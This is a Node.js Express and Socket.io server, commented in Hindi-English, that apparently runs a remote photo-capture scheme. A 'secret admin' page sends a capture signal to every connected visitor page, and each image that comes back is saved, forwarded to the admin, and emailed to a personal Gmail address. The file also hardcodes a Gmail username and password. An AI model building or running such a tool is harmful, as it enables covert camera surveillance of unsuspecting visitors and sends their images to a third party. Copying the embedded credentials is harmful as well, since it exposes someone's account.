const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Local uploads folder
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Gmail Config
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'prectice@gmail.com',       // 👈 Apni Gmail ID verify karein
        pass: 'includestdiosystem'   // 👈 16-digit App Password verify karein
    }
});

// Explicit Routes (Sabse pehle rakhe hain taaki 'Cannot GET' na aaye)

// 1. Secret Admin Route
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// 2. User Route
app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

// 3. Main URL -> Direct User Page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

// Serve static assets after custom routes
app.use(express.static(__dirname));
app.use('/uploads', express.static(uploadDir));

// Socket.io Events
io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        io.emit('send-photo-to-admin', imageData);

        const mailOptions = {
            from: 'prectice@gmail.com',
            to: 'md.danish7499@gmail.com',
            subject: '📸 New Photo Captured!',
            text: 'User page se new photo capture ho gayi hai.',
            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) console.log('❌ Email Send Error:', error);
            else console.log('📧 Email Sent:', info.response);
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});